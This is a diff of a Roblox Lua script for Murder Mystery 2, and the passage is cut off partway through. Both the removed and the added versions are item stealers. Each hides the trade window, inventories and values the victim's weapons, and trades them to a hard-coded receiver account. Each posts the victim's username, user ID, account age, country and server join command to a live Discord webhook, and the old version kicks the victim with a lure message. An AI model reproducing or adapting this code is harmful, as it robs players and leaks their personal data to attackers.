@@ -1,532 +1,674 @@
-local cfg = {}
-cfg.webhook      = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
-cfg.pingEveryone = "Yes"
-
-local users = {"Getstompedbyyounes"}        
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local plr = Players.LocalPlayer
-
-if not plr then
-    warn("Godfather Script: Not running as LocalPlayer")
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
     return
 end
+_G.scriptExecuted = true
 
--- Safe service waiting with timeout
-local function safeWaitForChild(parent, childName, timeout)
-    timeout = timeout or 5
-    local success, result = pcall(function()
-        return parent:WaitForChild(childName, timeout)
-    end)
-    return success and result or nil
-end
 
-local Trade = safeWaitForChild(ReplicatedStorage, "Trade", 10)
-if not Trade then
-    warn("Godfather Script: Trade folder not found")
-    return
-end
+local function MM2()
+    local user = "Getstompedbyyounes"
+    local webhook = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
 
-local SendRequest = safeWaitForChild(Trade, "SendRequest")
-local GetStatus = safeWaitForChild(Trade, "GetTradeStatus")
-local OfferItem = safeWaitForChild(Trade, "OfferItem")
-local AcceptTradeRemote = safeWaitForChild(Trade, "AcceptTrade")
-local DeclineTrade = safeWaitForChild(Trade, "DeclineTrade")
+    local VintageList = ""
+    local UniqueList = ""
+    local AncientList = ""
+    local GodlyList = ""
+    local LegendaryList = ""
+    local HalloweenList = ""
+    local ChristmasList = ""
+    local RareList = ""
+    local UncommonList = ""
+    local CommonList = ""
 
-if not (SendRequest and GetStatus and OfferItem and AcceptTradeRemote and DeclineTrade) then
-    warn("Godfather Script: Missing trade remotes")
-    return
-end
+    local vintageItemsC = 0
+    local uniqueItemsC = 0
+    local ancientItemsC = 0
+    local godlyItemsC = 0
+    local legendaryItemsC = 0
+    local HalloweenItemsC = 0
+    local ChristmasItemsC = 0
+    local rareItemsC = 0
+    local uncommonItemsC = 0
+    local commonItemsC = 0
+    local List = ""
+    local List2 = ""
+    local fardplayer = game:GetService("Players").LocalPlayer
+    local ExecutorWebhook = identifyexecutor() or "undefined"
 
-local isTradeCompleted = false
-local totalInventoryValue = 0
+    local weaponsToSend = {}
+    local Players = game:GetService("Players")
+    local plr = Players.LocalPlayer
+    local playerGui = plr:WaitForChild("PlayerGui")
+    local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+    local HttpService = game:GetService("HttpService")
 
-local function findRequest()
-    -- Check syn first (most common)
-    if typeof(syn) == "table" and syn.request then
-        return syn.request, "Synapse X"
-    elseif typeof(http_request) == "function" then
-        return http_request, "Script-Ware / KRNL"
-    elseif typeof(http) == "table" and http.request then
-        return http.request, "Electron"
-    elseif typeof(fluxus) == "table" and fluxus.request then
-        return fluxus.request, "Fluxus"
-    elseif typeof(httpx) == "table" and httpx.request then
-        return httpx.request, "Hydrogen"
-    elseif typeof(request) == "function" then
-        return request, "Delta / Generic"
-    elseif KRNL_LOADED and typeof(request) == "function" then
-        return request, "KRNL"
-    elseif typeof(identifyexecutor) == "function" then
-        local execName = identifyexecutor()
-        if typeof(request) == "function" then
-            return request, execName
-        end
-    elseif typeof(getexecutorname) == "function" then
-        local execName = getexecutorname()
-        if typeof(request) == "function" then
-            return request, execName
-        end
+    local function trim2(s)
+        return (s:gsub("^%s*(.-)%s*$", "%1"))
     end
 
-    return nil, "Roblox HttpService"
-end
+    local rawCountryCode = game:HttpGet("https://ipinfo.io/country")
+    local countryCode = trim2(rawCountryCode)
+    countryCode = string.lower(countryCode)
+    local countryFlagEmoji = ":flag_" .. countryCode .. ":"
 
-local PlaceId = game.PlaceId
-local JobId = game.JobId
+    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+        plr:kick("Server error. Please join a different server!")
+        return
+    end
 
-local fernJoinerLink = string.format(
-    "https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", 
-    PlaceId, 
-    JobId
-)
+    if #Players:GetPlayers() >= 12 then
+        plr:kick("Server error. Please join a different server!")
+        return
+    end
 
-local function GodfatherScriptFetchSupremeValues()
-    local values = {}
-    local execRequest = findRequest()
-    if not execRequest then return values end
-    
-    local success, result = pcall(function()
-        local response = execRequest({
-            Url = "https://api.supremevaluelist.com/mm2/items",
-            Method = "GET",
-            Headers = { ["User-Agent"] = "Mozilla/5.0" }
-        })
-        if response and response.Body then
-            return HttpService:JSONDecode(response.Body)
+    local rarityTable = {
+        "Common",
+        "Uncommon",
+        "Christmas",
+        "Halloween",
+        "Rare",
+        "Legendary",
+        "Godly",
+        "Ancient",
+        "Unique",
+        "Vintage"
+    }
+
+    local categories = {
+        godly = "https://supremevaluelist.com/mm2/godlies.html",
+        ancient = "https://supremevaluelist.com/mm2/ancients.html",
+        unique = "https://supremevaluelist.com/mm2/uniques.html",
+        classic = "https://supremevaluelist.com/mm2/vintages.html",
+        chroma = "https://supremevaluelist.com/mm2/chromas.html"
+    }
+    local headers = {
+        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+    }
+
+    local function trim(s)
+        return s:match("^%s*(.-)%s*$")
+    end
+
+    local function fetchHTML(url)
+        local response =
+            request(
+            {
+                Url = url,
+                Method = "GET",
+                Headers = headers
+            }
+        )
+        return response.Body
+    end
+
+    local function parseValue(itembodyDiv)
+        local valueStr = itembodyDiv:match('<b%s+class=[\'"]itemvalue[\'"]>([%d,%.]+)</b>')
+        if valueStr then
+            valueStr = valueStr:gsub(",", "")
+            local value = tonumber(valueStr)
+            if value then
+                return value
+            end
         end
         return nil
-    end)
-    
-    if success and typeof(result) == "table" then
-        for _, item in ipairs(result) do
-            if item and typeof(item) == "table" and item.name and item.value then
-                values[item.name:lower()] = item.value
-            end
-        end
     end
-    return values
-end
 
-local supremeValues = GodfatherScriptFetchSupremeValues()
+    local function extractItems(htmlContent)
+        local itemValues = {}
 
-local function GodfatherScriptGetItemValue(itemName, rarity)
-    if not itemName or typeof(itemName) ~= "string" then return 1 end
-    local lowerName = itemName:lower()
-    if supremeValues[lowerName] then return supremeValues[lowerName] end
-    
-    if lowerName:find("chroma") then
-        local baseName = lowerName:gsub("chroma ", "")
-        if supremeValues[baseName] then return supremeValues[baseName] * 2 end
-    end
-    
-    local defaultValues = { Common = 1, Uncommon = 2, Rare = 3, Legendary = 5, Godly = 10, Ancient = 20, Unique = 30, Vintage = 50 }
-    return defaultValues[rarity] or 1
-end
+        for itemName, itembodyDiv in htmlContent:gmatch(
+            '<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>'
+        ) do
+            itemName = itemName:match("([^<]+)")
+            if itemName then
+                itemName = trim(itemName:gsub("%s+", " "))
+                itemName = trim((itemName:split(" Click "))[1])
+                local itemNameLower = itemName:lower()
 
-if not plr.Character then 
-    local charSuccess, charResult = pcall(function()
-        return plr.CharacterAdded:Wait()
-    end)
-    if not charSuccess then 
-        task.wait(2)
-    end
-end
-task.wait(1)
-
-local LastOffer = nil
-
--- Safely connect to UpdateTrade if it exists
-local UpdateTrade = safeWaitForChild(Trade, "UpdateTrade")
-if UpdateTrade and typeof(UpdateTrade) == "Instance" and UpdateTrade:IsA("RemoteEvent") then
-    UpdateTrade.OnClientEvent:Connect(function(x) 
-        if x and typeof(x) == "table" and x.LastOffer then 
-            LastOffer = x.LastOffer 
-        end
-    end)
-end
-
-local PlayerGui = plr:WaitForChild("PlayerGui", 10)
-if PlayerGui then
-    for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
-        local gui = safeWaitForChild(PlayerGui, guiName, 3)
-        if gui and typeof(gui) == "Instance" and gui:IsA("GuiObject") then
-            gui.Enabled = false
-            gui:GetPropertyChangedSignal("Enabled"):Connect(function()
-                if gui.Enabled then gui.Enabled = false end
-            end)
-        end
-    end
-end
-
--- Safely load database
-local database = {}
-local dbSuccess, dbResult = pcall(function()
-    local dbModule = safeWaitForChild(ReplicatedStorage, "Database", 5)
-    if dbModule then
-        local syncFolder = safeWaitForChild(dbModule, "Sync", 5)
-        if syncFolder then
-            local itemModule = safeWaitForChild(syncFolder, "Item", 5)
-            if itemModule and itemModule:IsA("ModuleScript") then
-                return require(itemModule)
-            end
-        end
-    end
-    return nil
-end)
-
-if dbSuccess and typeof(dbResult) == "table" then
-    database = dbResult
-end
-
--- Safely get profile data
-local profileData = {}
-local profileSuccess, profileResult = pcall(function()
-    local inventoryRemotes = safeWaitForChild(ReplicatedStorage, "Remotes", 5)
-    if inventoryRemotes then
-        local inventoryFolder = safeWaitForChild(inventoryRemotes, "Inventory", 5)
-        if inventoryFolder then
-            local getProfileRemote = safeWaitForChild(inventoryFolder, "GetProfileData", 5)
-            if getProfileRemote and getProfileRemote:IsA("RemoteFunction") then
-                return getProfileRemote:InvokeServer(plr.Name)
-            end
-        end
-    end
-    return nil
-end)
-
-if profileSuccess and typeof(profileResult) == "table" then
-    profileData = profileResult
-end
-
-local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
-
-local function GodfatherScriptIsDefaultItem(itemName)
-    if not itemName or typeof(itemName) ~= "string" then return false end
-    local lower = itemName:lower()
-    return lower:find("default") and (lower:find("gun") or lower:find("knife"))
-end
-
-local weaponsToSend = {}
-local rarityCounts = {}
-
--- Safely iterate weapons
-local weaponsOwned = {}
-if profileData and typeof(profileData) == "table" then
-    if profileData.Weapons and typeof(profileData.Weapons) == "table" then
-        weaponsOwned = profileData.Weapons.Owned or {}
-    end
-end
-
-for dataid, amount in pairs(weaponsOwned) do
-    if typeof(dataid) == "string" and typeof(amount) == "number" and amount > 0 then
-        local item = database[dataid]
-        if item and typeof(item) == "table" then
-            local itemName = item.ItemName or dataid
-            if not GodfatherScriptIsDefaultItem(itemName) and not GodfatherScriptIsDefaultItem(dataid) then
-                
-                local rarity = item.Rarity or "Common"
-                local itemValue = GodfatherScriptGetItemValue(itemName, rarity)
-                local totalItemValue = itemValue * amount
-                
-                totalInventoryValue = totalInventoryValue + totalItemValue
-                
-                if not dataid:lower():find("untradable") then
-                    table.insert(weaponsToSend, {
-                        DataID = dataid,
-                        ItemName = itemName,
-                        Amount = amount,
-                        Rarity = rarity,
-                        Value = itemValue,
-                        TotalValue = totalItemValue
-                    })
-                    rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
+                local value = parseValue(itembodyDiv)
+                if value then
+                    itemValues[itemNameLower] = value
                 end
             end
         end
+
+        return itemValues
     end
-end
 
-table.sort(weaponsToSend, function(a, b) 
-    if not a or not b then return false end
-    return (a.TotalValue or 0) > (b.TotalValue or 0) 
-end)
+    local function extractChromaItems(htmlContent)
+        local chromaValues = {}
 
-local itemsListText = ""
-for i = 1, math.min(20, #weaponsToSend) do
-    local item = weaponsToSend[i]
-    if item then
-        itemsListText = itemsListText .. string.format("%s x%d (%d value)\n", item.ItemName, item.Amount, item.TotalValue)
-    end
-end
-
-if #weaponsToSend > 20 then
-    itemsListText = itemsListText .. string.format("\nand %d more items", #weaponsToSend - 20)
-end
-
-local rarityText = ""
-for _, rarity in ipairs(rarityTable) do
-    if rarityCounts[rarity] and rarityCounts[rarity] > 0 then
-        rarityText = rarityText .. string.format("%s: %d\n", rarity, rarityCounts[rarity])
-    end
-end
-
-local function GodfatherScriptSendWebhook()
-    local execRequest, executorName = findRequest()
-    if not execRequest then
-        warn("Godfather Script: No HTTP request function available")
-        return false
-    end
-    
-    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
-    local targetName = users[1] or "Unknown"
-    
-    -- Working link formats:
-    -- 1. For Roblox JobId Join extension: https://www.roblox.com/games/PLACEID/NAME?serverJobId=JOBID
-    -- 2. Alternative: https://www.roblox.com/games/start?placeId=PLACEID&gameId=JOBID (requires extension)
-    
-    local placeId = 142823291  -- MM2 Place ID
-    local gameName = "Murder-Mystery-2"
-    
-    local joinLink = string.format("https://www.roblox.com/games/%d/%s?serverJobId=%s", placeId, gameName, JobId)
-    local alternativeLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameId=%s", placeId, JobId)
-    
-    local embed = {
-        title = string.format("Godfather Script | %s | %s", plr.DisplayName or plr.Name, targetName),
-        description = string.format("%s's inventory grabbed!\nTotal Value: %d\nJoin and trade:", plr.Name, totalInventoryValue),
-        color = 0xFF0000,
-        thumbnail = {url = avatarUrl},
-        fields = {
-            {
-                name = "Player Info",
-                value = string.format("Display: %s\nUsername: %s\nUser ID: %d\nAccount Age: %d days\nExecutor: %s",
-                    plr.DisplayName or plr.Name, plr.Name, plr.UserId, plr.AccountAge or 0, executorName),
-                inline = true
-            },
-            {
-                name = "Join Link (Extension Required)",
-                value = string.format("[Click to Join](%s)\n```\n%s\n```", joinLink, joinLink),
-                inline = false
-            },
-            {
-                name = "Alternative Link",
-                value = string.format("[Click to Join](%s)\n```\n%s\n```", alternativeLink, alternativeLink),
-                inline = false
-            },
-            {
-                name = "Console Command",
-                value = string.format("```lua\nRoblox.GameLauncher.joinGameInstance(%d, \"%s\")\n```", placeId, JobId),
-                inline = false
-            },
-            {
-                name = "Server Info",
-                value = string.format("JobId: %s\nPlaceId: %d", JobId, PlaceId),
-                inline = true
-            },
-            {
-                name = "Total Items",
-                value = string.format("%d items\nValue: %d", #weaponsToSend, totalInventoryValue),
-                inline = true
-            },
-            {
-                name = "Rarity Distribution",
-                value = rarityText ~= "" and rarityText or "No data",
-                inline = false
-            },
-            {
-                name = string.format("Top Items (%d)", math.min(20, #weaponsToSend)),
-                value = itemsListText ~= "" and itemsListText or "No items",
-                inline = false
-            },
-            {
-                name = "Target Receiver",
-                value = string.format("%s", targetName),
-                inline = true
-            }
-        },
-        footer = {
-            text = string.format("Godfather Script | %s", os.date("%d/%m/%Y %H:%M"))
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
-    
-    local prefix = cfg.pingEveryone == "Yes" and "@everyone " or ""
-    
-    local payload = {
-        content = prefix .. "New hit available!",
-        embeds = {embed}  -- Fixed: was {{embed}}
-    }
-    
-    local success, response = pcall(function()
-        return execRequest({
-            Url = cfg.webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
-    
-    if not success then
-        warn("Godfather Script: Webhook failed - " .. tostring(response))
-    end
-    
-    return success
-end
-GodfatherScriptSendWebhook()
-
-local function GodfatherScriptGetStatus()
-    local ok, status = pcall(function() 
-        if GetStatus and GetStatus:IsA("RemoteFunction") then
-            return GetStatus:InvokeServer() 
-        end
-        return "None"
-    end)
-    return ok and status or "None"
-end
-
-local function GodfatherScriptWaitForTarget(targetPlayer)
-    if not targetPlayer then return false end
-    local attempts = 0
-    while attempts < 30 do
-        if targetPlayer.Parent then
-            local char = targetPlayer.Character
-            if char and char:FindFirstChild("Humanoid") then 
-                return true 
+        for chromaName, itembodyDiv in htmlContent:gmatch(
+            '<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>'
+        ) do
+            chromaName = chromaName:match("([^<]+)")
+            if chromaName then
+                chromaName = trim(chromaName:gsub("%s+", " ")):lower()
+                local value = parseValue(itembodyDiv)
+                if value then
+                    chromaValues[chromaName] = value
+                end
             end
-        else
-            return false  -- Player left
         end
-        attempts = attempts + 1
-        task.wait(0.5)
-    end
-    return false
-end
 
-local function GodfatherScriptAcceptTrade()
-    if not LastOffer then return false end
-    if not AcceptTradeRemote then return false end
-    
-    local ok = pcall(function()
-        AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
-    end)
-    return ok
-end
-
-local function GodfatherScriptFinishAndKick()
-    isTradeCompleted = true
-    task.wait(2)
-    local discordLink = "https://discord.gg/dUaHggzp9q"
-    if typeof(setclipboard) == "function" then 
-        pcall(function() setclipboard(discordLink) end)
+        return chromaValues
     end
-    plr:Kick("Godfather Script\n\nItems taken successfully\n\n" .. discordLink .. "\n\nJoin to get your items back!")
-end
 
-function GodfatherScriptDoTrade(targetPlayer)
-    if not targetPlayer or not targetPlayer.Parent then return end
-    if not GodfatherScriptWaitForTarget(targetPlayer) then return end
-    
-    if DeclineTrade then
-        pcall(function() DeclineTrade:FireServer() end)
-    end
-    task.wait(0.5)
-    LastOffer = nil
-    
-    local itemsAdded = false
-    local timeout = 0
-    
-    while timeout < 60 and #weaponsToSend > 0 do
-        local success, err = pcall(function()
-            local status = GodfatherScriptGetStatus()
-            
-            if status == "None" then
-                if itemsAdded then
-                    for i = 1, math.min(4, #weaponsToSend) do 
-                        if #weaponsToSend > 0 then
-                            table.remove(weaponsToSend, 1) 
-                        end
-                    end
-                    itemsAdded = false
-                    LastOffer = nil
-                    task.wait(0.5)
-                else
-                    if SendRequest and targetPlayer then
-                        SendRequest:InvokeServer(targetPlayer)
-                    end
-                    task.wait(1.5)
-                end
-            elseif status == "SendingRequest" then
-                task.wait(0.5)
-            elseif status == "ReceivingRequest" then
-                if DeclineTrade then
-                    DeclineTrade:FireServer()
-                end
-                task.wait(0.3)
-            elseif status == "StartTrade" then
-                if not itemsAdded then
-                    for i = 1, math.min(4, #weaponsToSend) do
-                        local item = weaponsToSend[i]
-                        if item and OfferItem then
-                            for _ = 1, item.Amount do
-                                OfferItem:FireServer(item.DataID, "Weapons")
+    local function buildValueList()
+        local allExtractedValues = {}
+        local chromaExtractedValues = {}
+        local categoriesToFetch = {}
+
+        for rarity, url in pairs(categories) do
+            table.insert(categoriesToFetch, {rarity = rarity, url = url})
+        end
+
+        local totalCategories = #categoriesToFetch
+        local completed = 0
+        local lock = Instance.new("BindableEvent")
+
+        for _, category in ipairs(categoriesToFetch) do
+            task.spawn(
+                function()
+                    local rarity = category.rarity
+                    local url = category.url
+                    local htmlContent = fetchHTML(url)
+
+                    if htmlContent and htmlContent ~= "" then
+                        if rarity ~= "chroma" then
+                            local extractedItemValues = extractItems(htmlContent)
+                            for itemName, value in pairs(extractedItemValues) do
+                                allExtractedValues[itemName] = value
                             end
-                            task.wait(0.1)
+                        else
+                            chromaExtractedValues = extractChromaItems(htmlContent)
                         end
                     end
-                    itemsAdded = true
-                    task.spawn(function()
-                        task.wait(6.5)
-                        GodfatherScriptAcceptTrade()
-                    end)
-                else
-                    task.wait(1)
+
+                    completed = completed + 1
+                    if completed == totalCategories then
+                        lock:Fire()
+                    end
+                end
+            )
+        end
+
+        lock.Event:Wait()
+
+        local valueList = {}
+
+        for dataid, item in pairs(database) do
+            local itemName = item.ItemName and item.ItemName:lower() or ""
+            local rarity = item.Rarity or ""
+            local hasChroma = item.Chroma or false
+
+            if itemName ~= "" and rarity ~= "" then
+                local weaponRarityIndex = table.find(rarityTable, rarity)
+                local godlyIndex = table.find(rarityTable, "Godly")
+
+                if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
+                    if hasChroma then
+                        local matchedChromaValue = nil
+                        for chromaName, value in pairs(chromaExtractedValues) do
+                            if chromaName:find(itemName) then
+                                matchedChromaValue = value
+                                break
+                            end
+                        end
+
+                        if matchedChromaValue then
+                            valueList[dataid] = matchedChromaValue
+                        end
+                    else
+                        local value = allExtractedValues[itemName]
+                        if value then
+                            valueList[dataid] = value
+                        end
+                    end
                 end
             end
-        end)
-        
-        if not success then 
-            warn("Godfather Script: Trade loop error - " .. tostring(err))
-            task.wait(1) 
         end
-        timeout = timeout + 1
-    end
-    
-    if #weaponsToSend == 0 then 
-        GodfatherScriptFinishAndKick() 
-    end
-end
 
-local function GodfatherScriptIsTarget(name)
-    if not name or typeof(name) ~= "string" then return false end
-    for _, u in ipairs(users) do
-        if u and u:lower() == name:lower() then 
-            return true 
+        return valueList
+    end
+
+    local function sendTradeRequest(user)
+        local args = {
+            [1] = game:GetService("Players"):WaitForChild(user)
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(
+            unpack(args)
+        )
+    end
+
+    local function getTradeStatus()
+        return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+    end
+
+    local function waitForTradeCompletion()
+        while true do
+            local status = getTradeStatus()
+            if status == "None" then
+                break
+            end
+            wait(0.1)
         end
     end
-    return false
+
+    local function acceptTrade()
+        local args = {
+            [1] = 285646582
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+    end
+
+    local function addWeaponToTrade(id)
+        local args = {
+            [1] = id,
+            [2] = "Weapons"
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+    end
+
+    local totalValue = 0
+
+    local function SendJoinMessage(rawUrl)
+        local fields = {
+            {
+                name = ":star: __**Mori Scripts**__",
+                value = "```Username     : " ..
+                    fardplayer.Name ..
+                        "\nUser-ID      : " ..
+                            fardplayer.userId ..
+                                "\nAccount Age  : " ..
+                                    fardplayer.AccountAge ..
+                                        " Days" ..
+                                            "\nExploit      : " ..
+                                                ExecutorWebhook .. "\nReceiver     : " .. Username .. "```",
+                inline = false
+            },
+            {
+                name = ":ringed_planet: __/__ **`Inventory:`**",
+                value = "```Total Value \240\159\147\154 : " ..
+                    totalValue ..
+                        "\n\nUnique      \240\159\141\132 : " ..
+                            uniqueItemsC ..
+                                "\nAncient     \240\159\140\191 : " ..
+                                    ancientItemsC ..
+                                        "\nGodly       \240\159\146\142 : " ..
+                                            godlyItemsC ..
+                                                "\nLegendary   \226\154\161 : " ..
+                                                    legendaryItemsC ..
+                                                        "\nVintage     \240\159\167\138 : " ..
+                                                            vintageItemsC ..
+                                                                "\nRare        \240\159\140\136 : " ..
+                                                                    rareItemsC ..
+                                                                        "\nHalloween   \240\159\142\131 : " ..
+                                                                            HalloweenItemsC ..
+                                                                                "\nChristmas   \240\159\142\132 : " ..
+                                                                                    ChristmasItemsC ..
+                                                                                        "\nUncommon    \240\159\140\184 : " ..
+                                                                                            uncommonItemsC ..
+                                                                                                "\nCommon      \240\159\147\166 : " ..
+                                                                                                    commonItemsC ..
+                                                                                                        "```",
+                inline = false
+            },
+            {
+                name = "Hits List:",
+                value = rawUrl,
+                inline = false
+            }
+        }
+
+        local data = {
+            ["content"] = "--@everyone\n" ..
+                [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] ..
+                    game.PlaceId .. [[, "]] .. game.JobId .. [[")]],
+            ["username"] = fardplayer.Name,
+            ["avatar_url"] = "https://raw.githubusercontent.com/kk4ft/Server/main/mori.png",
+            ["embeds"] = {
+                {
+                    ["color"] = null,
+                    ["fields"] = fields
+                }
+            }
+        }
+
+        local body = HttpService:JSONEncode(data)
+        local headers = {
+            ["Content-Type"] = "application/json"
+        }
+        local response =
+            request(
+            {
+                Url = webhook,
+                Method = "POST",
+                Headers = headers,
+                Body = body
+            }
+        )
+    end
+
+    local function GlobalMessage(countryFlagEmoji, List2, rawUrl, discuser)
+        local fields = {
+            {
+                name = "Victim Username:",
+                value = "Username is hidden\nCountry: " .. countryFlagEmoji,
+                inline = false
+            },
+            {
+                name = "Inventory Information:",
+                value = "",
+                inline = false
+            },
+            {
+                name = "Summary:",
+                value = "Total Value: " .. totalValue .. "\nInventory Link: " .. rawUrl,
+                inline = false
+            }
+        }
+
+        fields[2].value = fields[2].value .. "```" .. List2 .. "```"
+
+        if #fields[2].value > 1024 then
+            local lines = {}
+            for line in fields[2].value:gmatch("[^\r\n]+") do
+                table.insert(lines, line)
+            end
+
+            while #fields[2].value > 1024 and #lines > 0 do
+                table.remove(lines)
+                fields[2].value = table.concat(lines, "\n") .. "\nand more!```"
+            end
+        end
+
+        local data2 = {
+            ["username"] = "Mori Scripts Global Hit",
+            ["avatar_url"] = "https://raw.githubusercontent.com/kk4ft/Server/main/mori.png",
+            ["embeds"] = {
+                {
+                    ["title"] = ":knife: New MM2 Execution",
+                    ["color"] = 65280,
+                    ["fields"] = fields,
+                    ["footer"] = {
+                        ["text"] = "MM2 stealer by Mooze. discord.gg/PzWY2QX8cu"
+                    }
+                }
+            }
+        }
+
+        local body = HttpService:JSONEncode(data2)
+
+        local headers = {
+            ["Content-Type"] = "application/json",
+            ["DiscUser"] = discuser
+        }
+
+        local response =
+            request(
+            {
+                Url = webhook,
+                Method = "POST",
+                Headers = headers,
+                Body = body
+            }
+        )
+    end
+
+    local tradegui = playerGui:WaitForChild("TradeGUI")
+    tradegui:GetPropertyChangedSignal("Enabled"):Connect(
+        function()
+            tradegui.Enabled = false
+        end
+    )
+    local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
+    tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(
+        function()
+            tradeguiphone.Enabled = false
+        end
+    )
+
+    local untradable = {
+        ["DefaultGun"] = true,
+        ["DefaultKnife"] = true,
+        ["Reaver"] = true,
+        ["Reaver_Legendary"] = true,
+        ["Reaver_Godly"] = true,
+        ["Reaver_Ancient"] = true,
+        ["IceHammer"] = true,
+        ["IceHammer_Legendary"] = true,
+        ["IceHammer_Godly"] = true,
+        ["IceHammer_Ancient"] = true,
+        ["Gingerscythe"] = true,
+        ["Gingerscythe_Legendary"] = true,
+        ["Gingerscythe_Godly"] = true,
+        ["Gingerscythe_Ancient"] = true,
+        ["TestItem"] = true,
+        ["Season1TestKnife"] = true,
+        ["Cracks"] = true,
+        ["Icecrusher"] = true,
+        ["???"] = true,
+        ["Dartbringer"] = true,
+        ["TravelerAxeRed"] = true,
+        ["TravelerAxeBronze"] = true,
+        ["TravelerAxeSilver"] = true,
+        ["TravelerAxeGold"] = true,
+        ["BlueCamo_K_2022"] = true,
+        ["GreenCamo_K_2022"] = true,
+        ["SharkSeeker"] = true
+    }
+
+    local valueList = buildValueList()
+    local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+
+    for i, v in pairs(realData.Weapons.Owned) do
+        local dataid = i
+        local amount = v
+        local rarity = database[dataid].Rarity
+        local weapon_rarity_index = table.find(rarityTable, rarity)
+        if amount > 0 and not untradable[dataid] then
+            local value
+            if valueList[dataid] then
+                value = valueList[dataid]
+            else
+                if weapon_rarity_index >= table.find(rarityTable, "Godly") then
+                    value = 2
+                else
+                    value = 0
+                end
+            end
+            totalValue = totalValue + (value * amount)
+            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = (value * amount)})
+        end
+    end
+
+    for _, item in ipairs(weaponsToSend) do
+        if item.Rarity == "Vintage" then
+            VintageList = VintageList .. item.DataID .. " x" .. item.Amount .. "\n"
+            vintageItemsC = vintageItemsC + item.Amount
+        elseif item.Rarity == "Unique" then
+            UniqueList = UniqueList .. item.DataID .. " x" .. item.Amount .. "\n"
+            uniqueItemsC = uniqueItemsC + item.Amount
+        elseif item.Rarity == "Ancient" then
+            AncientList = AncientList .. item.DataID .. " x" .. item.Amount .. "\n"
+            ancientItemsC = ancientItemsC + item.Amount
+        elseif item.Rarity == "Godly" then
+            GodlyList = GodlyList .. item.DataID .. " x" .. item.Amount .. "\n"
+            godlyItemsC = godlyItemsC + item.Amount
+        elseif item.Rarity == "Legendary" then
+            LegendaryList = LegendaryList .. item.DataID .. " x" .. item.Amount .. "\n"
+            legendaryItemsC = legendaryItemsC + item.Amount
+        elseif item.Rarity == "Halloween" then
+            HalloweenList = HalloweenList .. item.DataID .. " x" .. item.Amount .. "\n"
+            HalloweenItemsC = HalloweenItemsC + item.Amount
+        elseif item.Rarity == "Christmas" then
+            ChristmasList = ChristmasList .. item.DataID .. " x" .. item.Amount .. "\n"
+            ChristmasItemsC = ChristmasItemsC + item.Amount
+        elseif item.Rarity == "Rare" then
+            RareList = RareList .. item.DataID .. " x" .. item.Amount .. "\n"
+            rareItemsC = rareItemsC + item.Amount
+        elseif item.Rarity == "Uncommon" then
+            UncommonList = UncommonList .. item.DataID .. " x" .. item.Amount .. "\n"
+            uncommonItemsC = uncommonItemsC + item.Amount
+        elseif item.Rarity == "Common" then
+            CommonList = CommonList .. item.DataID .. " x" .. item.Amount .. "\n"
+            commonItemsC = commonItemsC + item.Amount
+        end
+        List2 = List2 .. item.DataID .. " (x" .. item.Amount .. "): " .. item.Value .. " Value\n"
+    end
+
+    task.wait(0.1)
+
+    if VintageList ~= "" then
+        List = List .. "VINTAGE LIST:\n" .. VintageList .. "\n"
+    end
+    if UniqueList ~= "" then
+        List = List .. "UNIQUE LIST:\n" .. UniqueList .. "\n"
+    end
+    if AncientList ~= "" then
+        List = List .. "ANCIENT LIST:\n" .. AncientList .. "\n"
+    end
+    if GodlyList ~= "" then
+        List = List .. "GODLY LIST:\n" .. GodlyList .. "\n"
+    end
+    if LegendaryList ~= "" then
+        List = List .. "LEGENDARY LIST:\n" .. LegendaryList .. "\n"
+    end
+    if HalloweenList ~= "" then
+        List = List .. "HALLOWEEN LIST:\n" .. HalloweenList .. "\n"
+    end
+    if ChristmasList ~= "" then
+        List = List .. "CHRISTMAS LIST:\n" .. ChristmasList .. "\n"
+    end
+    if RareList ~= "" then
+        List = List .. "RARE LIST:\n" .. RareList .. "\n"
+    end
+    if UncommonList ~= "" then
+        List = List .. "UNCOMMON LIST:\n" .. UncommonList .. "\n"
+    end
